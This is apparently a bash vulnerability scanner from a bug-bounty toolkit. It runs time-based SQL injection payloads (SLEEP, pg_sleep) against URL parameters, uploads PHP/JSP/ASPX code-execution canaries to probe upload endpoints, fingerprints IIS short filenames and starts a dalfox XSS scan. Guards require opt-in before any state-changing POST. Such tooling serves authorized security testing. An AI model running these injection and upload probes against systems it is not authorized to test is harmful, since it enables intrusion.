#!/bin/bash
# =============================================================================
# Vulnerability Scanner
# Automated vulnerability checks against recon results
# Usage: ./vuln_scanner.sh <recon_dir> [--quick] [--full] [--skip module1,module2]
# Standard and quick mode skip the XSS lane by default. Use --full to include it.
#
# Coverage matrix feedback:
#   On completion this script writes findings/<target>/scanner_pass.json,
#   listing each (endpoint, vuln_class, module) pair the scanner exercised
#   (per task 05-16-b4-scanner-matrix-feedback). `tools/coverage_matrix.py
#   rebuild` consumes this artifact to mark already-tested cells `tested_clean`
#   so the F3 finish-gate does not fire on cells the scanner already swept.
# =============================================================================

set -euo pipefail

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

log_ok()    { echo -e "${GREEN}[+]${NC} $1"; }
log_err()   { echo -e "${RED}[-]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
log_info()  { echo -e "${CYAN}[*]${NC} $1"; }
log_step()  { echo -e "    ${CYAN}[>]${NC} $1"; }
log_done()  { echo -e "    ${GREEN}[✓]${NC} $1"; }
log_vuln()  { echo -e "    ${RED}[VULN]${NC} $1"; }
log_crit()  { echo -e "    ${RED}[CRITICAL]${NC} $1"; }

timeout_bin() {
    if command -v timeout >/dev/null 2>&1; then
        printf '%s\n' timeout
    elif command -v gtimeout >/dev/null 2>&1; then
        printf '%s\n' gtimeout
    else
        printf '%s\n' ""
    fi
}

run_with_timeout() {
    local limit="$1"
    shift
    local timeout_cmd
    timeout_cmd="$(timeout_bin)"
    if [ -n "$timeout_cmd" ]; then
        "$timeout_cmd" "$limit" "$@"
    else
        "$@"
    fi
}

RECON_DIR=""
QUICK_MODE=""
FULL_MODE=""
USER_SKIP_CHECKS=""
DEFAULT_SKIP_CHECKS=""
SKIP_CHECKS=""

while [ "$#" -gt 0 ]; do
    case "$1" in
        --quick)
            QUICK_MODE="--quick"
            ;;
        --full)
            FULL_MODE="--full"
            ;;
        --skip)
            shift
            if [ "$#" -eq 0 ]; then
                log_err "--skip requires a comma-separated value"
                exit 1
            fi
            USER_SKIP_CHECKS="${USER_SKIP_CHECKS:-}${USER_SKIP_CHECKS:+,}$1"
            ;;
        --skip=*)
            USER_SKIP_CHECKS="${USER_SKIP_CHECKS:-}${USER_SKIP_CHECKS:+,}${1#--skip=}"
            ;;
        -*)
            log_err "Unknown option: $1"
            echo "Usage: $0 <recon_dir> [--quick] [--full] [--skip module1,module2]" >&2
            exit 1
            ;;
        *)
            if [ -n "$RECON_DIR" ]; then
                log_err "Unexpected argument: $1"
                echo "Usage: $0 <recon_dir> [--quick] [--full] [--skip module1,module2]" >&2
                exit 1
            fi
            RECON_DIR="$1"
            ;;
    esac
    shift
done

if [ -z "$RECON_DIR" ]; then
    echo "Usage: $0 <recon_dir> [--quick] [--full] [--skip module1,module2]" >&2
    exit 1
fi

if [ ! -d "$RECON_DIR" ]; then
    log_err "Recon directory not found: $RECON_DIR"
    exit 1
fi

RECON_DIR="$(cd "$RECON_DIR" && pwd)"

# Determine target name from recon dir
BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"

# Auth-aware hunting: load BBHUNT_AUTH_HEADERS into BB_AUTH_ARGS.
# shellcheck source=tools/_auth_helper.sh
. "$(dirname "$0")/_auth_helper.sh"

if [ "$(basename "$(dirname "$RECON_DIR")")" = "sessions" ]; then
    SESSION_ID=$(basename "$RECON_DIR")
    TARGET=$(basename "$(dirname "$(dirname "$RECON_DIR")")")
    DEFAULT_FINDINGS_DIR="$BASE_DIR/findings/$TARGET/sessions/$SESSION_ID"
else
    SESSION_ID=""
    TARGET=$(basename "$RECON_DIR")
    DEFAULT_FINDINGS_DIR="$BASE_DIR/findings/$TARGET"
fi

FINDINGS_DIR="${FINDINGS_OUT_DIR:-$DEFAULT_FINDINGS_DIR}"
THREADS="${BB_SCAN_THREADS:-10}"
RATE_LIMIT="${BB_SCAN_RATE_LIMIT:-20}"  # Conservative default to avoid WAF blocks (429/403)
PRIORITY_DIR="$RECON_DIR/priority"

if [ "$QUICK_MODE" = "--quick" ]; then
    SCAN_MODE="quick"
elif [ "$FULL_MODE" = "--full" ]; then
    SCAN_MODE="full"
else
    SCAN_MODE="standard"
fi

if [ "$FULL_MODE" != "--full" ]; then
    DEFAULT_SKIP_CHECKS="xss"
fi

SKIP_CHECKS="$DEFAULT_SKIP_CHECKS"
if [ -n "$USER_SKIP_CHECKS" ]; then
    SKIP_CHECKS="${SKIP_CHECKS:-}${SKIP_CHECKS:+,}$USER_SKIP_CHECKS"
fi

unsafe_method_guard() {
    local method="$1"
    local url="$2"
    local label="$3"
    local guard_output decision reason

    # Align with the original scanner behavior: safe methods are allowed by
    # default, while unsafe/state-changing probes require an explicit
    # per-invocation opt-in via ALLOW_UNSAFE_HTTP_TESTS=1.
    guard_output=$(PYTHONPATH="$BASE_DIR${PYTHONPATH:+:$PYTHONPATH}" python3 - "$method" "$url" <<'PY'
import sys
from memory.audit_log import SafeMethodPolicy

method = (sys.argv[1] or "").upper()
url = sys.argv[2] if len(sys.argv) > 2 else ""
policy = SafeMethodPolicy()
if policy.is_safe(method):
    print("allow")
    print("")
else:
    print("require_approval")
    print(f"Unsafe method {method} for {url} requires ALLOW_UNSAFE_HTTP_TESTS=1")
PY
) || {
        log_warn "Unable to evaluate safe-method policy for $label; skipping"
        return 1
    }

    decision=$(printf '%s\n' "$guard_output" | sed -n '1p')
    reason=$(printf '%s\n' "$guard_output" | sed -n '2p')

    if [ "$decision" = "require_approval" ] && [ "${ALLOW_UNSAFE_HTTP_TESTS:-0}" != "1" ]; then
        log_warn "Skipping $label: $reason"
        mkdir -p "$FINDINGS_DIR/manual_review"
        printf '%s\tmethod=%s\tlabel=%s\turl=%s\treason=%s\n' \
            "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
            "$method" \
            "$label" \
            "$url" \
            "$reason" >> "$FINDINGS_DIR/manual_review/unsafe_skipped.txt"
        return 1
    fi

    if [ "$decision" = "require_approval" ]; then
        log_warn "$label uses unsafe HTTP method $method. Proceeding because ALLOW_UNSAFE_HTTP_TESTS=1 is set."
    fi

    return 0
}

mkdir -p "$FINDINGS_DIR"/{upload,xss,sqli,takeover,misconfig,exposure,ssrf,cves,redirects,idor,auth_bypass,ssti,mfa,saml,metasploit,manual_review,.tmp}

echo "============================================="
echo "  Vulnerability Scanner — $TARGET"
echo "  Recon: $RECON_DIR"
echo "  Findings: $FINDINGS_DIR"
echo "  Mode: $SCAN_MODE"
echo "  Skip: ${SKIP_CHECKS:-none}"
if [ -n "$DEFAULT_SKIP_CHECKS" ]; then
    echo "  Default skip: $DEFAULT_SKIP_CHECKS (use --full to include)"
fi
bb_auth_active && bb_auth_banner
echo "============================================="
echo ""

# Helper: count findings
count_findings() {
    local file="$1"
    if [ -f "$file" ] && [ -s "$file" ]; then
        wc -l < "$file" | tr -d ' '
    else
        echo "0"
    fi
}

count_vuln() {
    count_findings "$1"
}

write_summary_json() {
    local output_path="$1"

    python3 - "$TARGET" "$SESSION_ID" "$SCAN_MODE" "$RECON_DIR" "$FINDINGS_DIR" \
        "$SKIP_CHECKS" "$LIVE_COUNT" "$ORDERED_SCAN" "$output_path" <<'PY'
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

target, session_id, scan_mode, recon_dir, findings_dir, skip_checks, live_count, ordered_scan, output_path = sys.argv[1:]
findings_root = Path(findings_dir)
ordered_scan_path = Path(ordered_scan)

categories = [
    "upload",
    "sqli",
    "xss",
    "ssti",
    "takeover",
    "misconfig",
    "exposure",
    "ssrf",
    "cves",
    "redirects",
    "idor",
    "auth_bypass",
    "mfa",
    "saml",
    "metasploit",
]


def count_lines(path: Path) -> int:
    if not path.is_file():
        return 0

    with path.open(encoding="utf-8", errors="replace") as handle:
        return sum(1 for line in handle if line.rstrip("\n"))


def count_matching_lines(path: Path, marker: str) -> int:
    if not path.is_file():
        return 0

    with path.open(encoding="utf-8", errors="replace") as handle:
        return sum(1 for line in handle if marker in line)


category_summary = {}
total_findings = 0

for category in categories:
    category_dir = findings_root / category
    files = []
    category_total = 0

    for path in sorted(category_dir.glob("*.txt")):
        line_count = count_lines(path)
        if line_count <= 0:
            continue

        category_total += line_count
        files.append({
            "path": str(path.relative_to(findings_root)),
            "count": line_count,
        })

    artifacts = [
        str(path.relative_to(findings_root))
        for pattern in ("*.json", "*.md", "*.rc")
        for path in sorted(category_dir.glob(pattern))
        if path.is_file()
    ]

    category_summary[category] = {
        "total": category_total,
        "files": files,
        "artifacts": artifacts,
    }
    total_findings += category_total

manual_review_files = []
seen_manual_paths = set()
for path in list(findings_root.glob("*/manual*.txt")) + list((findings_root / "manual_review").glob("*.txt")):
    if not path.is_file():
        continue

    rel = str(path.relative_to(findings_root))
    if rel in seen_manual_paths:
        continue

    seen_manual_paths.add(rel)
    manual_review_files.append({
        "path": rel,
        "count": count_lines(path),
    })

manual_review_items = sum(item["count"] for item in manual_review_files)

summary = {
    "schema_version": 1,
    "generated_at": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
    "target": target,
    "session_id": session_id or None,
    "mode": scan_mode,
    "recon_dir": recon_dir,
    "findings_dir": findings_dir,
    "live_count": int(live_count or 0),
    "ordered_scan_count": count_lines(ordered_scan_path),
    "ordered_scan_file": str(ordered_scan_path),
    "skipped_checks": [],
    "categories": category_summary,
    "totals": {
        "findings": total_findings,
        "manual_review_items": manual_review_items,
        "high_value": {
            "verified_sqli_pocs": count_matching_lines(findings_root / "sqli" / "timebased_candidates.txt", "SQLI-POC-VERIFIED"),
            "verified_rce_pocs": count_lines(findings_root / "upload" / "verified_rce_pocs.txt"),
            "verified_upload_pocs": count_lines(findings_root / "upload" / "verified_upload_pocs.txt"),
            "ssti_confirmed": count_matching_lines(findings_root / "ssti" / "ssti_candidates.txt", "SSTI-CONFIRMED"),
            "mfa_findings": count_lines(findings_root / "mfa" / "findings.txt"),
            "saml_findings": count_lines(findings_root / "saml" / "findings.txt"),
            "metasploit_rc_files": len(list((findings_root / "metasploit").glob("*.rc"))),
        },
    },
    "manual_review": manual_review_files,
}

for item in [item.strip() for item in skip_checks.split(",") if item.strip()]:
    if item == "all":
        summary["skipped_checks"] = ["all"]
        break
    if item not in summary["skipped_checks"]:
        summary["skipped_checks"].append(item)

Path(output_path).write_text(json.dumps(summary, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
PY
}

tool_ok() {
    command -v "$1" >/dev/null 2>&1
}

has_skip() {
    local source="${1:-}"
    local want="${2:-}"
    [ -n "$want" ] || return 1
    case ",$source," in
        *",all,"*|*",$want,"*)
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

skip_has() {
    has_skip "$SKIP_CHECKS" "$1"
}

scan_limit() {
    local quick="$1"
    local standard="$2"
    local full="$3"

    if [ "$QUICK_MODE" = "--quick" ]; then
        printf '%s\n' "$quick"
    elif [ "$FULL_MODE" = "--full" ]; then
        printf '%s\n' "$full"
    else
        printf '%s\n' "$standard"
    fi
}

iis_signature_grep() {
    grep -qiE 'Microsoft-IIS|X-AspNet-Version|X-AspNetMvc-Version|X-Powered-By:[[:space:]]*ASP\.NET|ASP\.NET'
}

append_iis_targets_from_recon_file() {
    local source_file="$1"
    local output_file="$2"

    [ -s "$source_file" ] || return 0

    grep -iE 'Microsoft-IIS|X-AspNet-Version|X-AspNetMvc-Version|X-Powered-By:[[:space:]]*ASP\.NET|ASP\.NET' \
        "$source_file" 2>/dev/null | awk '{print $1}' >> "$output_file" || true
}

detect_iis_shortname_targets() {
    local output_file="$1"
    local trace_file="$2"
    local source_file probe_limit url headers header_summary

    : > "$output_file"
    : > "$trace_file"

    for source_file in \
        "$RECON_DIR/live/httpx_full.txt" \
        "$RECON_DIR/httpx_full.txt" \
        "$RECON_DIR/live/status_200.txt" \
        "$RECON_DIR/live/status_3xx.txt" \
        "$RECON_DIR/live/status_401.txt" \
        "$RECON_DIR/live/status_403.txt"
    do
        append_iis_targets_from_recon_file "$source_file" "$output_file"
    done

    probe_limit=$(scan_limit 10 30 80)
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        grep -Fxq "$url" "$output_file" 2>/dev/null && continue

        headers=$(curl -skI "${BB_AUTH_ARGS[@]}" --max-time 8 "$url" 2>/dev/null || true)
        if printf '%s\n' "$headers" | iis_signature_grep; then
            printf '%s\n' "$url" >> "$output_file"
            header_summary=$(printf '%s\n' "$headers" | tr '\r' '\n' \
                | grep -iE '^(server|x-aspnet|x-powered-by):' \
                | tr '\n' ' ' | sed 's/[[:space:]]*$//') || true
            [ -n "$header_summary" ] || header_summary="IIS/ASP.NET header fingerprint"
            printf '[IIS-DETECTED] %s | %s\n' "$url" "$header_summary" >> "$trace_file"
        fi
    done < <(head -"$probe_limit" "$ORDERED_SCAN")

    sort -u "$output_file" -o "$output_file" 2>/dev/null || true
    if [ -s "$trace_file" ]; then
        sort -u "$trace_file" -o "$trace_file" 2>/dev/null || true
    else
        rm -f "$trace_file"
    fi
}

run_iis_shortname_checks() {
    local iis_targets="$FINDINGS_DIR/.tmp/iis_shortname_targets.txt"
    local iis_trace="$FINDINGS_DIR/.tmp/iis_shortname_detected.txt"
    local shortscan_findings="$FINDINGS_DIR/misconfig/iis_shortnames.txt"
    local manual_file="$FINDINGS_DIR/manual_review/iis_shortnames.txt"
    local raw_dir="$FINDINGS_DIR/misconfig/iis_shortnames_raw"
    local iis_count url safe_name raw_out result_count=0

    detect_iis_shortname_targets "$iis_targets" "$iis_trace"
    rm -f "$shortscan_findings" "$manual_file"

    if [ ! -s "$iis_targets" ]; then
        log_done "IIS short filename: no IIS/ASP.NET fingerprint detected"
        return 0
    fi

    iis_count=$(count_findings "$iis_targets")
    log_step "IIS/ASP.NET fingerprint detected on $iis_count URL(s)"

    if ! tool_ok shortscan; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            printf '[IIS-SHORTNAME-MANUAL] %s | shortscan missing; run: shortscan %s -s -p 1\n' "$url" "$url" >> "$manual_file"
        done < "$iis_targets"
        log_warn "shortscan not installed; wrote manual IIS short filename review hints: $manual_file"
        return 0
    fi

    mkdir -p "$raw_dir"
    while IFS= read -r url; do
        [ -z "$url" ] && continue

        safe_name=$(printf '%s\n' "$url" | tr '[:upper:]' '[:lower:]' | sed 's|[^a-z0-9]|_|g')
        raw_out="$raw_dir/${safe_name}.txt"

        log_step "Running shortscan $url -s -p 1"
        if ! run_with_timeout 900 shortscan "$url" -s -p 1 > "$raw_out" 2>&1; then
            log_warn "shortscan did not complete cleanly for $url; saved output: $raw_out"
        fi

        if [ ! -s "$raw_out" ]; then
            printf '[IIS-SHORTNAME-REVIEW] %s | shortscan produced no output; rerun: shortscan %s -s -p 1\n' "$url" "$url" >> "$manual_file"
            continue
        fi

        if grep -qi 'Vulnerable:' "$raw_out" && ! grep -qiE 'Vulnerable:[[:space:]]*No' "$raw_out"; then
            printf '[IIS-SHORTNAME] %s | shortscan output: %s\n' "$url" "$raw_out" >> "$shortscan_findings"
            result_count=$((result_count + 1))
        else
            log_done "IIS short filename: no positive shortscan signal for $url"
        fi
    done < "$iis_targets"

    if [ "$result_count" -gt 0 ]; then
        log_vuln "IIS short filename signals: $result_count"
    fi

    if [ -s "$manual_file" ]; then
        log_warn "IIS short filename manual review hints: $(count_findings "$manual_file")"
    else
        rm -f "$manual_file"
    fi
}

now_ms() {
    python3 - <<'PY' 2>/dev/null || date +%s000
import time

print(time.monotonic_ns() // 1_000_000)
PY
}

replace_param_value() {
    local url="$1"
    local index="$2"
    local payload="$3"

    python3 - "$url" "$index" "$payload" <<'PY' 2>/dev/null || printf '%s\n' "$url"
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

url = sys.argv[1]
index = int(sys.argv[2])
payload = sys.argv[3]
parts = urlsplit(url)
pairs = parse_qsl(parts.query, keep_blank_values=True)

if not pairs or index < 1 or index > len(pairs):
    print(url)
    raise SystemExit

key, _value = pairs[index - 1]
pairs[index - 1] = (key, payload)
print(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(pairs), parts.fragment)))
PY
}

replace_all_param_values() {
    local url="$1"
    local payload="$2"

    python3 - "$url" "$payload" <<'PY' 2>/dev/null || printf '%s\n' "$url"
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

url = sys.argv[1]
payload = sys.argv[2]
parts = urlsplit(url)
pairs = parse_qsl(parts.query, keep_blank_values=True)

if not pairs:
    print(url)
    raise SystemExit

print(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode([(k, payload) for k, _ in pairs]), parts.fragment)))
PY
}

verify_sqli_poc() {
    local url="$1"
    local param_index="$2"
    local dialect="$3"
    local payload_1 payload_2 url_1 url_2 t0_start t0 t1_start t1 t2_start t2 d1 d2

    log_step "  [VERIFY] Linear scaling check on param #$param_index ($dialect)..."

    t0_start=$(now_ms)
    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 20 "$url" >/dev/null 2>&1 || true
    t0=$(( $(now_ms) - t0_start ))

    payload_1="' AND SLEEP(1)-- "
    payload_2="' AND SLEEP(2)-- "
    if [ "$dialect" = "postgres" ]; then
        payload_1="'||pg_sleep(1)-- "
        payload_2="'||pg_sleep(2)-- "
    fi

    url_1=$(replace_param_value "$url" "$param_index" "$payload_1")
    t1_start=$(now_ms)
    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 25 "$url_1" >/dev/null 2>&1 || true
    t1=$(( $(now_ms) - t1_start ))

    url_2=$(replace_param_value "$url" "$param_index" "$payload_2")
    t2_start=$(now_ms)
    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 30 "$url_2" >/dev/null 2>&1 || true
    t2=$(( $(now_ms) - t2_start ))

    d1=$(( t1 - t0 ))
    d2=$(( t2 - t1 ))

    if [ "$d1" -gt 800 ] && [ "$d2" -gt 800 ]; then
        log_crit "  [POC-CONFIRMED] Linear scaling: T0=${t0}ms T1=${t1}ms T2=${t2}ms"
        return 0
    fi

    return 1
}

verify_upload_poc() {
    local upload_url="$1"
    local base_url ts headers ext payload canary canary_path param dir probe_url resp

    if ! unsafe_method_guard "POST" "$upload_url" "upload canary probe"; then
        return 1
    fi

    base_url=$(printf '%s\n' "$upload_url" | cut -d'/' -f1-3)
    ts=$(date +%s)
    headers=$(curl -sk "${BB_AUTH_ARGS[@]}" -I --max-time 5 "$upload_url" 2>/dev/null || true)
    ext="php"
    payload='<?php echo "RCE-VAL-".(7*7); ?>'

    if printf '%s\n' "$headers" | grep -qi "jsp\|java\|tomcat"; then
        ext="jsp"
        payload='<% out.print("RCE-VAL-" + (7*7)); %>'
    fi

    if printf '%s\n' "$headers" | grep -qi "asp\|aspx\|\\.net"; then
        ext="aspx"
        payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'
    fi

    canary="proof_${ts}_$$.${ext}"
    canary_path="${TMPDIR:-/tmp}/$canary"
    printf '%s\n' "$payload" > "$canary_path"

    log_step "  [VERIFY] Attempting upload canary (${ext}): $upload_url..."

    for param in file upload FileData userfile image; do
        curl -sk "${BB_AUTH_ARGS[@]}" -F "${param}=@${canary_path}" --max-time 10 "$upload_url" >/dev/null 2>&1 || true

        for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
            probe_url="${base_url}${dir}${canary}"
            resp=$(curl -sk "${BB_AUTH_ARGS[@]}" -f --max-time 5 "$probe_url" 2>/dev/null || true)

            if printf '%s\n' "$resp" | grep -q "RCE-VAL-49"; then
                log_crit "  [POC-RCE-CONFIRMED] Code execution verified: $probe_url"
                echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
                rm -f "$canary_path"
                return 0
            fi

            if printf '%s\n' "$resp" | grep -q "RCE-VAL-"; then
                log_vuln "  [POC-UPLOAD-ONLY] File saved but not executed: $probe_url"
                echo "[UPLOAD-ONLY-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_upload_pocs.txt"
            fi
        done
    done

    rm -f "$canary_path"
    return 1
}

# Collect live URLs for scanning
LIVE_URLS="$RECON_DIR/live/urls.txt"
PARAM_URLS_RAW="$RECON_DIR/urls/with_params.txt"
PARAM_URLS="$FINDINGS_DIR/.tmp/with_params.filtered.txt"
ALL_URLS="$RECON_DIR/urls/all.txt"

if [ ! -s "$LIVE_URLS" ] 2>/dev/null; then
    log_warn "No live URLs found. Checking alternative locations..."
    if [ -s "$RECON_DIR/live/httpx_full.txt" ]; then
        awk '{print $1}' "$RECON_DIR/live/httpx_full.txt" > "$LIVE_URLS"
    else
        log_err "No live hosts data found in recon. Run recon_engine.sh first."
        exit 1
    fi
fi

LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
log_info "Scanning $LIVE_COUNT live hosts"

ORDERED_SCAN="$FINDINGS_DIR/ordered_scan_targets.txt"
: > "$ORDERED_SCAN"

for candidate_file in \
    "$PRIORITY_DIR/critical_hosts.txt" \
    "$PRIORITY_DIR/high_hosts.txt" \
    "$PRIORITY_DIR/prioritized_hosts.txt" \
    "$LIVE_URLS"
do
    [ -s "$candidate_file" ] && cat "$candidate_file" >> "$ORDERED_SCAN"
done

awk '!seen[$0]++' "$ORDERED_SCAN" > "${ORDERED_SCAN}.tmp" && mv "${ORDERED_SCAN}.tmp" "$ORDERED_SCAN"
if [ ! -s "$ORDERED_SCAN" ]; then
    log_err "No scan targets found"
    exit 1
fi

# ============================================================
# Noise filter prep: SPA fingerprints + dedup'd PARAM_URLS
# ============================================================
mkdir -p "$FINDINGS_DIR/.tmp"
SPA_FP="$FINDINGS_DIR/.tmp/spa_fingerprints.json"
if command -v python3 &>/dev/null; then
    log_step "Computing SPA-fallback fingerprints..."
    (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter fingerprint \
        --hosts "$ORDERED_SCAN" --out "$SPA_FP" 2>/dev/null) || \
        python3 "$(dirname "$0")/noise_filter.py" fingerprint \
            --hosts "$ORDERED_SCAN" --out "$SPA_FP" 2>/dev/null || true

    if [ -s "$PARAM_URLS_RAW" ]; then
        log_step "Dedup + liveness-filter PARAM_URLS..."
        (cd "$BASE_DIR" 2>/dev/null && python3 -m tools.noise_filter dedup \
            --input "$PARAM_URLS_RAW" --output "$PARAM_URLS" 2>/dev/null) || \
            python3 "$(dirname "$0")/noise_filter.py" dedup \
                --input "$PARAM_URLS_RAW" --output "$PARAM_URLS" 2>/dev/null || \
            cp "$PARAM_URLS_RAW" "$PARAM_URLS"
    else
        : > "$PARAM_URLS"
    fi
else
    [ -s "$PARAM_URLS_RAW" ] && cp "$PARAM_URLS_RAW" "$PARAM_URLS" || : > "$PARAM_URLS"
fi
# Always keep PARAM_URLS readable downstream even if filter produced empty file.
[ -f "$PARAM_URLS" ] || cp "$PARAM_URLS_RAW" "$PARAM_URLS" 2>/dev/null || : > "$PARAM_URLS"

# ============================================================
# Check 0: Upload Surface Discovery
# ============================================================
echo ""
if ! skip_has upload; then
    log_info "Check 0: Upload Surface Discovery"

    UPLOAD_HOST_LIMIT=$(scan_limit 10 30 60)
    CATCHALL_HOSTS="$FINDINGS_DIR/.tmp/catchall_hosts.txt"
    : > "$CATCHALL_HOSTS"

    log_step "Detecting catchall behavior..."
    while IFS= read -r host; do
        [ -z "$host" ] && continue
        CATCH_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 10 "${host%/}/non_existent_${RANDOM}_$(date +%s)" 2>/dev/null || echo "000")
        if [ "$CATCH_CODE" = "200" ]; then
            log_warn "Catchall detected: $host"
            echo "$host" >> "$CATCHALL_HOSTS"
        fi
    done < <(head -10 "$ORDERED_SCAN")

    PROBE_PATHS=(
        "/upload.php"
        "/uploader.php"
        "/upload/index.php"
        "/filemanager/index.php"
        "/ckfinder/core/connector/php/connector.php"
        "/fckeditor/editor/filemanager/connectors/php/connector.php"
        "/elfinder.php"
        "/admin/upload"
    )

    while IFS= read -r host; do
        [ -z "$host" ] && continue
        grep -Fxq "$host" "$CATCHALL_HOSTS" 2>/dev/null && continue

        for path in "${PROBE_PATHS[@]}"; do
            UPLOAD_URL="${host%/}${path}"
            UPLOAD_CODE=$(curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null -w "%{http_code}" --max-time 5 "$UPLOAD_URL" 2>/dev/null || echo "000")
            if [ "$UPLOAD_CODE" = "200" ]; then
                log_vuln "Found upload path: $UPLOAD_URL"
                echo "[UPLOAD-CANDIDATE] $UPLOAD_URL" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
                verify_upload_poc "$UPLOAD_URL" || true
            fi
        done
    done < <(head -"$UPLOAD_HOST_LIMIT" "$ORDERED_SCAN")
else
    log_warn "Skipping upload checks (--skip)"
fi

# ============================================================
# Check 0.5: SQL Injection
# ============================================================
echo ""
if ! skip_has sqli; then
    log_info "Check 0.5: SQL Injection"

    if command -v nuclei &>/dev/null; then
        log_step "Running nuclei SQLi templates..."
        nuclei -l "$ORDERED_SCAN" \
            -tags sqli \
            -severity medium,high,critical \
            -silent \
            -rate-limit "$RATE_LIMIT" \
            "${BB_AUTH_ARGS[@]}" \
            -output "$FINDINGS_DIR/sqli/nuclei_sqli.txt" 2>/dev/null || true
    fi

    if [ -s "$PARAM_URLS" ]; then
        SQLI_LIMIT=$(scan_limit 5 10 20)
        log_step "Advanced SQLi verification on top $SQLI_LIMIT parameterized URLs..."

        while IFS= read -r url; do
            [ -z "$url" ] && continue
            BASE_START=$(now_ms)
            curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 10 "$url" >/dev/null 2>&1 || true
            BASE_MS=$(( $(now_ms) - BASE_START ))
            PARAM_COUNT=$(printf '%s\n' "$url" | awk -F= '{print NF-1}')
            [ "$PARAM_COUNT" -eq 0 ] && continue

            for PARAM_INDEX in $(seq 1 "$PARAM_COUNT"); do
                for DIALECT in mysql postgres; do
                    SQLI_PAYLOAD="' AND SLEEP(2)-- "
                    [ "$DIALECT" = "postgres" ] && SQLI_PAYLOAD="'||pg_sleep(2)-- "
                    SQLI_URL=$(replace_param_value "$url" "$PARAM_INDEX" "$SQLI_PAYLOAD")
                    SQLI_START=$(now_ms)
                    SQLI_RC=0
                    curl -sk "${BB_AUTH_ARGS[@]}" -o /dev/null --max-time 20 "$SQLI_URL" >/dev/null 2>&1 || SQLI_RC=$?
                    SQLI_MS=$(( $(now_ms) - SQLI_START ))

                    if [ "$SQLI_RC" -eq 0 ] && [ "$((SQLI_MS - BASE_MS))" -gt 1800 ]; then
                        if verify_sqli_poc "$url" "$PARAM_INDEX" "$DIALECT"; then
                            log_crit "EMPIRICAL SQLI POC: $url"
                            echo "[SQLI-POC-VERIFIED] dialect=$DIALECT param=$PARAM_INDEX url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                            break 2
                        fi

                        log_vuln "SQLi candidate (delay observed but not linear): $url"
                        echo "[SQLI-CANDIDATE] dialect=$DIALECT param=$PARAM_INDEX url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                    elif [ "$SQLI_RC" -eq 28 ] && [ "$SQLI_MS" -gt 18000 ]; then
                        log_warn "Potential SQLi timeout multiplier: $url"
                        echo "[SQLI-TIMEOUT-CANDIDATE] timeout=${SQLI_MS}ms param=$PARAM_INDEX url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                    fi
                done
            done
        done < <(head -"$SQLI_LIMIT" "$PARAM_URLS")
    fi
else
    log_warn "Skipping SQLi checks (--skip)"
fi

# ============================================================
# Check 1: XSS (Cross-Site Scripting)
# ============================================================
echo ""
if skip_has xss; then
    if has_skip "$USER_SKIP_CHECKS" all || has_skip "$USER_SKIP_CHECKS" xss; then
        log_warn "Skipping XSS checks (--skip)"
    elif has_skip "$DEFAULT_SKIP_CHECKS" xss; then
        log_warn "Skipping XSS checks (default; use --full to include)"
    else
        log_warn "Skipping XSS checks (--skip)"
    fi
else
    log_info "Check 1: XSS Detection"

    # Dalfox — automated XSS scanner
    if command -v dalfox &>/dev/null && [ -s "$PARAM_URLS" ]; then
        DAL_LIMIT=$(scan_limit 30 100 200)
        DAL_MAX_TIME=$(scan_limit 300 900 1200)
        DAL_DEDUP_FILE=$(mktemp "${TMPDIR:-/tmp}/dalfox_dedup_XXXXXX.txt")

        python3 - "$PARAM_URLS" "$DAL_DEDUP_FILE" <<'PY' 2>/dev/null || cp "$PARAM_URLS" "$DAL_DEDUP_FILE"
import sys
from urllib.parse import parse_qs, urlparse

seen = set()
with open(sys.argv[1], encoding="utf-8", errors="replace") as fin, open(sys.argv[2], "w", encoding="utf-8") as fout:
    for line in fin:
        url = line.strip()
        if not url:
            continue
        try:
            parsed = urlparse(url)
            key = (parsed.scheme, parsed.netloc, parsed.path, frozenset(parse_qs(parsed.query).keys()))
        except Exception:
            key = url
        if key in seen:
            continue
        seen.add(key)
        fout.write(url + "\n")
PY

        ORIG_COUNT=$(wc -l < "$PARAM_URLS" 2>/dev/null || echo 0)
        DEDUP_COUNT=$(wc -l < "$DAL_DEDUP_FILE" 2>/dev/null || echo 0)
        log_step "Running dalfox on $DAL_LIMIT URLs (deduped $ORIG_COUNT → $DEDUP_COUNT, timeout: ${DAL_MAX_TIME}s)..."
        head -"$DAL_LIMIT" "$DAL_DEDUP_FILE" | run_with_timeout "$DAL_MAX_TIME" dalfox pipe \
            --silence \
            --no-color \
            --worker "${DALFOX_WORKERS:-5}" \
            --delay "${DALFOX_DELAY:-100}" \
            --timeout 10 \
            "${BB_AUTH_ARGS[@]}" \
            --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
        rm -f "$DAL_DEDUP_FILE"

